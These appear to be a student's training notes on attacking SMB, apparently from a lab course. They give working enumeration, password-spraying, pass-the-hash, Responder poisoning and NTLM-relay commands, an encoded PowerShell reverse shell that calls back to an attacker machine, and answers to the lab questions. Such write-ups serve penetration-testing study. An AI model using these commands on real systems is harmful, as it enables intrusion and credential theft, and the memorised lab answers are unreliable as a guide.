Server Message Block (SMB) is a communication protocol created for providing shared access to files and printers across nodes on a network. Initially, it was designed to run on top of NetBIOS over TCP/IP (NBT) using TCP port `139` and UDP ports `137` and `138`. However, with Windows 2000, Microsoft added the option to run SMB directly over TCP/IP on port `445` without the extra NetBIOS layer. Nowadays, modern Windows operating systems use SMB over TCP but still support the NetBIOS implementation as a failover.

Samba is a Unix/Linux-based open-source implementation of the SMB protocol. It also allows Linux/Unix servers and Windows clients to use the same SMB services.

For instance, on Windows, SMB can run directly over port 445 TCP/IP without the need for NetBIOS over TCP/IP, but if Windows has NetBIOS enabled, or we are targetting a non-Windows host, we will find SMB running on port 139 TCP/IP. This means that SMB is running with NetBIOS over TCP/IP.

Another protocol that is commonly related to SMB is [MSRPC (Microsoft Remote Procedure Call)](https://en.wikipedia.org/wiki/Microsoft_RPC). RPC provides an application developer a generic way to execute a procedure (a.k.a. a function) in a local or remote process without having to understand the network protocols used to support the communication, as specified in [MS-RPCE](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rpce/290c38b1-92fe-4229-91e6-4fc376610c15), which defines an RPC over SMB Protocol that can use SMB Protocol named pipes as its underlying transport.

To attack an SMB Server, we need to understand its implementation, operating system, and which tools we can use to abuse it. As with other services, we can abuse misconfiguration or excessive privileges, exploit known vulnerabilities or discover new vulnerabilities. Furthermore, after we gain access to the SMB Service, if we interact with a shared folder, we need to be aware of the content in the directory. Finally, if we are targetting NetBIOS or RPC, identify which information we can get or what action we can perform on the target.

## Enumeration
```shell
sudo nmap 10.129.14.128 -sV -sC -p139,445

Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-19 15:15 CEST
Nmap scan report for 10.129.14.128
Host is up (0.00024s latency).

PORT    STATE SERVICE     VERSION
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
MAC Address: 00:00:00:00:00:00 (VMware)

Host script results:
|_nbstat: NetBIOS name: HTB, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-09-19T13:16:04
|_  start_date: N/A
```

The Nmap scan reveals essential information about the target:
- SMB version (Samba smbd 4.6.2)
- Hostname HTB
- Operating System is Linux based on SMB implementation

## Misconfigurations
SMB can be configured not to require authentication, which is often called a `null session`. Instead, we can log in to a system with no username or password.

#### Anonymous Authentication
If we find an SMB server that does not require a username and password or find valid credentials, we can get a list of shares, usernames, groups, permissions, policies, services, etc. Most tools that interact with SMB allow null session connectivity, including `smbclient`, `smbmap`, `rpcclient`, or `enum4linux`. Let's explore how we can interact with file shares and RPC using null authentication.

#### File Share
Using `smbclient`, we can display a list of the server's shares with the option `-L`, and using the option `-N`, we tell `smbclient` to use the null session.
```shell
 smbclient -N -L //10.129.14.128

        Sharename       Type      Comment
        -------      --     -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        notes           Disk      CheckIT
        IPC$            IPC       IPC Service (DEVSM)
SMB1 disabled no workgroup available
```

`Smbmap` is another tool that helps us enumerate network shares and access associated permissions. An advantage of `smbmap` is that it provides a list of permissions for each shared folder.

```shell
smbmap -H 10.129.14.128

[+] IP: 10.129.14.128:445     Name: 10.129.14.128                                   
        Disk                                                    Permissions     Comment
        --                                                   ---------    -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       IPC Service (DEVSM)
        notes                                                   READ, WRITE     CheckIT
```

Using `smbmap` with the `-r` or `-R` (recursive) option, one can browse the directories:
```shell-session
smbmap -H 10.129.14.128 -r notes

[+] Guest session       IP: 10.129.14.128:445    Name: 10.129.14.128                           
        Disk                                                    Permissions     Comment
        --                                                   ---------    -------
        notes                                                   READ, WRITE
        .\notes\*
        dr--r--r               0 Mon Nov  2 00:57:44 2020    .
        dr--r--r               0 Mon Nov  2 00:57:44 2020    ..
        dr--r--r               0 Mon Nov  2 00:57:44 2020    LDOUJZWBSG
        fw--w--w             116 Tue Apr 16 07:43:19 2019    note.txt
        fr--r--r               0 Fri Feb 22 07:43:28 2019    SDT65CB.tmp
        dr--r--r               0 Mon Nov  2 00:54:57 2020    TPLRNSMWHQ
        dr--r--r               0 Mon Nov  2 00:56:51 2020    WDJEQFZPNO
        dr--r--r               0 Fri Feb 22 07:44:02 2019    WindowsImageBackup
```

From the above example, the permissions are set to `READ` and `WRITE`, which one can use to upload and download the files.
```shell
smbmap -H 10.129.14.128 --download "notes\note.txt"

[+] Starting download: notes\note.txt (116 bytes)
[+] File output to: /htb/10.129.14.128-notes_note.txt
```

```shell
smbmap -H 10.129.14.128 --upload test.txt "notes\test.txt"

[+] Starting upload: test.txt (20 bytes)
[+] Upload complete.
```

#### Remote Procedure Call (RPC)
We can use the `rpcclient` tool with a null session to enumerate a workstation or Domain Controller.

The `rpcclient` tool offers us many different commands to execute specific functions on the SMB server to gather information or modify server attributes like a username. We can use this [cheat sheet from the SANS Institute](https://www.willhackforsushi.com/sec504/SMB-Access-from-Linux.pdf) or review the complete list of all these functions found on the [man page](https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html) of the `rpcclient`.

```shell
rpcclient -U'%' 10.10.110.17

rpcclient $> enumdomusers

user:[mhope] rid:[0x641]
user:[svc-ata] rid:[0xa2b]
user:[svc-bexec] rid:[0xa2c]
user:[roleary] rid:[0xa36]
user:[smorgan] rid:[0xa37]
```

`Enum4linux` is another utility that supports null sessions, and it utilizes `nmblookup`, `net`, `rpcclient`, and `smbclient` to automate some common enumeration from SMB targets such as:
- Workgroup/Domain name
- Users information
- Operating system information
- Groups information
- Shares Folders
- Password policy information

```shell
./enum4linux-ng.py 10.10.11.45 -A -C
```

## Protocol Specifics Attacks
If a null session is not enabled, we will need credentials to interact with the SMB protocol. Two common ways to obtain credentials are [brute forcing](https://en.wikipedia.org/wiki/Brute-force_attack) and [password spraying](https://owasp.org/www-community/attacks/Password_Spraying_Attack).

When brute-forcing, we try as many passwords as possible against an account, but it can lock out an account if we hit the threshold. We can use brute-forcing and stop before reaching the threshold if we know it. Otherwise, we do not recommend using brute force.

Password spraying is a better alternative since we can target a list of usernames with one common password to avoid account lockouts. We can try more than one password if we know the account lockout threshold. Typically, two to three attempts are safe, provided we wait 30-60 minutes between attempts. Let's explore the tool `NetExec` that includes the ability to execute password spraying.

```shell
> nxc smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!' --local-auth

SMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 18362 (name:WIN7BOX) (domain:WIN7BOX) (signing:False) (SMBv1:False)
SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\Administrator:Company01! STATUS_LOGON_FAILURE 
SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\jrodriguez:Company01! STATUS_LOGON_FAILURE 
SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\admin:Company01! STATUS_LOGON_FAILURE 
SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\eperez:Company01! STATUS_LOGON_FAILURE 
SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\amone:Company01! STATUS_LOGON_FAILURE 
SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\fsmith:Company01! STATUS_LOGON_FAILURE 
SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\tcrash:Company01! STATUS_LOGON_FAILURE 

<SNIP>

SMB         10.10.110.17 445    WIN7BOX  [+] WIN7BOX\jurena:Company01! (Pwn3d!) 
```

**Note:** By default NXC will exit after a successful login is found. Using the `--continue-on-success` flag will continue spraying even after a valid password is found. it is very useful for spraying a single password against a large user list. Additionally, if we are targetting a non-domain joined computer, we will need to use the option `--local-auth`. For a more detailed study Password Spraying see the Active Directory Enumeration & Attacks module.

#### SMB
When attacking a Windows SMB Server, our actions will be limited by the privileges we had on the user we manage to compromise. If this user is an Administrator or has specific privileges, we will be able to perform operations such as:
- Remote Command Execution
- Extract Hashes from SAM Database
- Enumerating Logged-on Users
- Pass-the-Hash (PTH)

#### Remote Code Execution (RCE)
[PsExec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec) is a tool that lets us execute processes on other systems, complete with full interactivity for console applications, without having to install client software manually. It works because it has a Windows service image inside of its executable.

We can download PsExec from [Microsoft website](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec), or we can use some Linux implementations:
- [Impacket PsExec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py) - Python PsExec like functionality example using [RemComSvc](https://github.com/kavika13/RemCom).
- [Impacket SMBExec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py) - A similar approach to PsExec without using [RemComSvc](https://github.com/kavika13/RemCom). The technique is described [here](https://web.archive.org/web/20190515131124/https://www.optiv.com/blog/owning-computers-without-shell-access). This implementation goes one step further, instantiating a local SMB server to receive the output of the commands. This is useful when the target machine does NOT have a writeable share available.
- [Impacket atexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/atexec.py) - This example executes a command on the target machine through the Task Scheduler service and returns the output of the executed command.
- [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) - includes an implementation of `smbexec` and `atexec`.
- [Metasploit PsExec](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/windows/smb/psexec.md) - Ruby PsExec implementation.

#### Impacket PsExec
```shell
impacket-psexec administrator:'Password123!'@10.10.110.17
```

## NetExec

Another tool we can use to run CMD or PowerShell is `NetExec`. One advantage of `NetExec` is the availability to run a command on multiples host at a time. To use it, we need to specify the protocol, `smb`, the IP address or IP address range, the option `-u` for username, and `-p` for the password, and the option `-x` to run cmd commands or uppercase `-X` to run PowerShell commands.

```shell
nxc smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec
```
**Note:** If the`--exec-method` is not defined, CrackMapExec will try to execute the atexec method, if it fails you can try to specify the `--exec-method` smbexec.

#### Enumerating Logged-on Users
Imagine we are in a network with multiple machines. Some of them share the same local administrator account. In this case, we could use `CrackMapExec` to enumerate logged-on users on all machines within the same network `10.10.110.17/24`, which speeds up our enumeration process.

```shell
nxc smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users

SMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 18362 (name:WIN7BOX) (domain:WIN7BOX) (signing:False) (SMBv1:False)
SMB         10.10.110.17 445    WIN7BOX  [+] WIN7BOX\administrator:Password123! (Pwn3d!)
SMB         10.10.110.17 445    WIN7BOX  [+] Enumerated loggedon users
SMB         10.10.110.17 445    WIN7BOX  WIN7BOX\Administrator             logon_server: WIN7BOX
SMB         10.10.110.17 445    WIN7BOX  WIN7BOX\jurena                    logon_server: WIN7BOX
SMB         10.10.110.21 445    WIN10BOX  [*] Windows 10.0 Build 19041 (name:WIN10BOX) (domain:WIN10BOX) (signing:False) (SMBv1:False)
SMB         10.10.110.21 445    WIN10BOX  [+] WIN10BOX\Administrator:Password123! (Pwn3d!)
SMB         10.10.110.21 445    WIN10BOX  [+] Enumerated loggedon users
SMB         10.10.110.21 445    WIN10BOX  WIN10BOX\demouser                logon_server: WIN10BOX
```

#### Extract Hashes from SAM Database
The Security Account Manager (SAM) is a database file that stores users' passwords. It can be used to authenticate local and remote users. If we get administrative privileges on a machine, we can extract the SAM database hashes for different purposes:
- Authenticate as another user.
- Password Cracking, if we manage to crack the password, we can try to reuse the password for other services or accounts.
- Pass The Hash. We will discuss it later in this section.

```shell-session
nxc smb 10.10.110.17 -u administrator -p 'Password123!' --sam
```

#### Pass-the-Hash (PtH)
If we manage to get an NTLM hash of a user, and if we cannot crack it, we can still use the hash to authenticate over SMB with a technique called Pass-the-Hash (PtH).

```shell
nxc smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE
```

#### Forced Authentication Attacks
We can also abuse the SMB protocol by creating a fake SMB Server to capture users' [NetNTLM v1/v2 hashes](https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4).

The most common tool to perform such operations is the `Responder`. [Responder](https://github.com/lgandx/Responder) is an LLMNR, NBT-NS, and MDNS poisoner tool with different capabilities, one of them is the possibility to set up fake services, including SMB, to steal NetNTLM v1/v2 hashes. In its default configuration, it will find LLMNR and NBT-NS traffic. Then, it will respond on behalf of the servers the victim is looking for and capture their NetNTLM hashes.

Let's illustrate an example to understand better how `Responder` works. Imagine we created a fake SMB server using the Responder default configuration, with the following command:

```shell
responder -I <interface name>
```

When a user or a system tries to perform a Name Resolution (NR), a series of procedures are conducted by a machine to retrieve a host's IP address by its hostname. On Windows machines, the procedure will roughly be as follows:
- The hostname file share's IP address is required.
- The local host file (C:\Windows\System32\Drivers\etc\hosts) will be checked for suitable records.
- If no records are found, the machine switches to the local DNS cache, which keeps track of recently resolved names.
- Is there no local DNS record? A query will be sent to the DNS server that has been configured.
- If all else fails, the machine will issue a multicast query, requesting the IP address of the file share from other machines on the network.

Suppose a user mistyped a shared folder's name `\\mysharefoder\` instead of `\\mysharedfolder\`. In that case, all name resolutions will fail because the name does not exist, and the machine will send a multicast query to all devices on the network, including us running our fake SMB server. This is a problem because no measures are taken to verify the integrity of the responses. Attackers can take advantage of this mechanism by listening in on such queries and spoofing responses, leading the victim to believe malicious servers are trustworthy. This trust is usually used to steal credentials.

```shell
sudo responder -I ens33



[+] Listening for events... 

[*] [NBT-NS] Poisoned answer sent to 10.10.110.17 for name WORKGROUP (service: Domain Master Browser)
[*] [NBT-NS] Poisoned answer sent to 10.10.110.17 for name WORKGROUP (service: Browser Election)
[*] [MDNS] Poisoned answer sent to 10.10.110.17   for name mysharefoder.local
[*] [LLMNR]  Poisoned answer sent to 10.10.110.17 for name mysharefoder
[*] [MDNS] Poisoned answer sent to 10.10.110.17   for name mysharefoder.local
[SMB] NTLMv2-SSP Client   : 10.10.110.17
[SMB] NTLMv2-SSP Username : WIN7BOX\demouser
[SMB] NTLMv2-SSP Hash     : demouser::WIN7BOX:997b18cc61099ba2:3CC46296B0CCFC7A231D918AE1DAE521:0101000000000000B09B51939BA6D40140C54ED46AD58E890000000002000E004E004F004D00410054004300480001000A0053004D0042003100320004000A0053004D0042003100320003000A0053004D0042003100320005000A0053004D0042003100320008003000300000000000000000000000003000004289286EDA193B087E214F3E16E2BE88FEC5D9FF73197456C9A6861FF5B5D3330000000000000000
```

All saved Hashes are located in Responder's logs directory (`/usr/share/responder/logs/`). We can copy the hash to a file and attempt to crack it using the hashcat module 5600.

```shell
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

The NTLMv2 hash was cracked. The password is `P@ssword`. If we cannot crack the hash, we can potentially relay the captured hash to another machine using [impacket-ntlmrelayx](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py) or Responder [MultiRelay.py](https://github.com/lgandx/Responder/blob/master/tools/MultiRelay.py). Let us see an example using `impacket-ntlmrelayx`.

First, we need to set SMB to `OFF` in our responder configuration file (`/etc/responder/Responder.conf`).

```shell
> cat /etc/responder/Responder.conf | grep 'SMB ='

SMB = Off
```

Then we execute `impacket-ntlmrelayx` with the option `--no-http-server`, `-smb2support`, and the target machine with the option `-t`. By default, `impacket-ntlmrelayx` will dump the SAM database, but we can execute commands by adding the option `-c`.

```shell
impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146


...
...
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:92512f2605074cfc341a7f16e5fabf08:::
demouser:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
test:1001:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
...
...
```

We can create a PowerShell reverse shell using [https://www.revshells.com/](https://www.revshells.com/), set our machine IP address, port, and the option Powershell #3 (Base64).

```shell
impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADIAMgAwAC4AMQAzADMAIgAsADkAMAAwADEAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA'
```

Once the victim authenticates to our server, we poison the response and make it execute our command to obtain a reverse shell.

```shell
> nc -lvnp 9001

listening on [any] 9001 ...
connect to [10.10.110.133] from (UNKNOWN) [10.10.110.146] 52471

PS C:\Windows\system32> whoami;hostname

nt authority\system
WIN11BOX
```

#### RPC
In the [Footprinting module](https://academy.hackthebox.com/course/preview/footprinting), we discuss how to enumerate a machine using RPC. Apart from enumeration, we can use RPC to make changes to the system, such as:
- Change a user's password.
- Create a new domain user.
- Create a new shared folder.


## Questions

1. What is the name of the shared folder with READ permissions?
```shell
> smbmap -H 10.129.203.6
 Disk                               Permissions	Comment
	----                            -----------	-------
	print$                           NO ACCESS	Printer Drivers
	GGJ                              READ ONLY	Priv
	IPC$                             NO ACCESS	IPC Service (attcsvc-linux Samba)
```

2. What is the password for the username "jason"?
```shell
Lets try yo brute force jason s password with the list found on FTP server.

> nxc smb 10.129.203.6 -u jason -p pws.list --local-auth
[+] ATTCSVC-LINUX\jason:34c8zuNBo91!@28Bszh

```

3. Retrieve flag.txt
```shell
Retrieve ssh key in GGJ:
> smbmap -H 10.129.203.6 -u jason -p '34c8zuNBo91!@28Bszh' --download  "GGJ\id_rsa"
> chmod 600 id_rsa
> ssh -i id_rsa jason@10.129.203.6
> cat flag.txt
HTB{SMB_4TT4CKS_2349872359}
```


---

## Latest SMB Vulnerabilities

One recent significant vulnerability that affected the SMB protocol was called [SMBGhost](https://arista.my.site.com/AristaCommunity/s/article/SMBGhost-Wormable-Vulnerability-Analysis-CVE-2020-0796) with the [CVE-2020-0796](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2020-0796). The vulnerability consisted of a compression mechanism of the version SMB v3.1.1 which made Windows 10 versions 1903 and 1909 vulnerable to attack by an unauthenticated attacker. The vulnerability allowed the attacker to gain remote code execution (`RCE`) and full access to the remote target system.

## The Concept of the Attack
In simple terms, this is an [integer overflow](https://en.wikipedia.org/wiki/Integer_overflow) vulnerability in a function of an SMB driver that allows system commands to be overwritten while accessing memory. An integer overflow results from a CPU attempting to generate a number that is greater than the value required for the allocated memory space.
#### Initiation of the Attack

| **Step** | **SMBGhost**                                                                                                | **Concept of Attacks - Category** |
| -------- | ----------------------------------------------------------------------------------------------------------- | --------------------------------- |
| `1.`     | The client sends a request manipulated by the attacker to the SMB server.                                   | `Source`                          |
| `2.`     | The sent compressed packets are processed according to the negotiated protocol responses.                   | `Process`                         |
| `3.`     | This process is performed with the system's privileges or at least with the privileges of an administrator. | `Privileges`                      |
| `4.`     | The local process is used as the destination, which should process these compressed packets.                | `Destination`                     |
#### Trigger Remote Code Execution
|**Step**|**SMBGhost**|**Concept of Attacks - Category**|
|---|---|---|
|`5.`|The sources used in the second cycle are from the previous process.|`Source`|
|`6.`|In this process, the integer overflow occurs by replacing the overwritten buffer with the attacker's instructions and forcing the CPU to execute those instructions.|`Process`|
|`7.`|The same privileges of the SMB server are used.|`Privileges`|
|`8.`|The remote attacker system is used as the destination, in this case, granting access to the local system.|`Destination`|
